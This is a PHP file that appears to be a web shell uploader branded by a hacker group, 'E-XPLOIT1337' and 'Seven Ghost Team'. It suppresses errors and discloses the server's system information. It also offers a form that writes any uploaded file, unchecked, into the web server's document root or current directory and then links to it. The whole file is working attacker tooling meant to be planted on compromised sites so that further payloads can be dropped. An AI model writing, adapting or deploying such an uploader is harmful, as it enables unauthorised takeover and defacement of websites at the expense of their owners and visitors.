<?php
error_reporting(0);
echo "
<title>[| E-XPLOIT1337 HOME ROOT UPLOADER |]</title>

<style type='text/css'>
@font-face{
font-family: 'riv';
src: url('https://bca-x666x-team.github.io/7gt-anon2.ttf');
}

body{
margin-top: 50%;
font-family: 'riv';
background: black;
color: white;
text-align: center;
}

pre{
font-family: 'riv';
font-size: 20px;
}

a{
color: lime;
text-decoration: none;
}
</style>

<img src='https://i.ibb.co/mJmCsfY/logo1337.png' width='450'>

<pre>PRIV7 HOME ROOT UPLOADER BY SEVEN GHOST TEAM AND BLACK CODERS ANONYMOUS
<font color='19BD9B'>[".php_uname()."]</font></pre>";

echo "
<br>
<form method='post' enctype='multipart/form-data'>

<input type='file' name='priv_file'>

<input type='submit' name='upload' value='UPLOAD'>
</form>

<pre>[ COPYRIGHT &COPY; 2K19 BY E-XPLOIT1337 ]</pre>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['priv_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
if(is_writable($root)) {
if(@copy($_FILES['priv_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "UPLOAD SUCCESSFULLY => <a href='$web/$files' target='_blank'>$web/$files</a>";
} else {
echo "FAILED TO UPLOAD IN DOCUMENT ROOT";
}
} else {
if(@copy($_FILES['priv_file']['tmp_name'], $files)) {
echo "SUCCESSFULLY UPLOADED $files IN THIS FOLDER";
} else {
echo "UPLOAD FAILED";
}
}
}
?>